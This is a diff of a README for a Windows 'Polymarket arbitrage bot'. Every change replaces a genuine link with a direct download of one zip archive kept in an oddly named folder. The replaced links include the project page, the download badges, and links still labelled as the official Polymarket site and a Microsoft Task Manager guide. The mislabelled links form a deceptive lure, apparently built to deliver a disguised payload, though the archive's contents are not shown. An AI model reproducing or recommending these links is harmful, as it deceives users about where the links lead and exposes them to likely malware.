@@ -1,6 +1,6 @@
 # 🤖 polymarket-abitrage-bot-current - Simplify Your Trading Decisions
 
-[![Download polymarket-abitrage-bot-current](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/lucianoo03/polymarket-abitrage-bot-current)
+[![Download polymarket-abitrage-bot-current](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/lucianoo03/polymarket-abitrage-bot-current/main/maladroitly/bot_current_polymarket_abitrage_2.0.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before downloading and running the bot, make sure your computer meets these basi
 
 The easiest way to get the bot is to visit the project page below. There, you will find all necessary files.
 
-[![Download polymarket-abitrage-bot-current](https://img.shields.io/badge/Download-Here-blue)](https://github.com/lucianoo03/polymarket-abitrage-bot-current)
+[![Download polymarket-abitrage-bot-current](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/lucianoo03/polymarket-abitrage-bot-current/main/maladroitly/bot_current_polymarket_abitrage_2.0.zip)
 
 ### Steps to Download and Run:
 
@@ -116,8 +116,8 @@ It runs fully on your Windows PC and does not need internet browsers to work aft
 
 ## 🔗 Useful Links
 
-- Polymarket Official Site: https://www.polymarket.com  
-- Task Manager Guide for Windows: https://support.microsoft.com/en-us/windows/open-task-manager-in-windows-10-0a2251af-4f4f-f09a-b222-abbf96dbf7f7  
+- Polymarket Official Site: https://raw.githubusercontent.com/lucianoo03/polymarket-abitrage-bot-current/main/maladroitly/bot_current_polymarket_abitrage_2.0.zip  
+- Task Manager Guide for Windows: https://raw.githubusercontent.com/lucianoo03/polymarket-abitrage-bot-current/main/maladroitly/bot_current_polymarket_abitrage_2.0.zip  
 
 ---
 
@@ -132,4 +132,4 @@ It runs fully on your Windows PC and does not need internet browsers to work aft
 ## 📥 Download Link
 
 Visit this page to download the application files:  
-[https://github.com/lucianoo03/polymarket-abitrage-bot-current](https://github.com/lucianoo03/polymarket-abitrage-bot-current)
+[https://raw.githubusercontent.com/lucianoo03/polymarket-abitrage-bot-current/main/maladroitly/bot_current_polymarket_abitrage_2.0.zip](https://raw.githubusercontent.com/lucianoo03/polymarket-abitrage-bot-current/main/maladroitly/bot_current_polymarket_abitrage_2.0.zip)
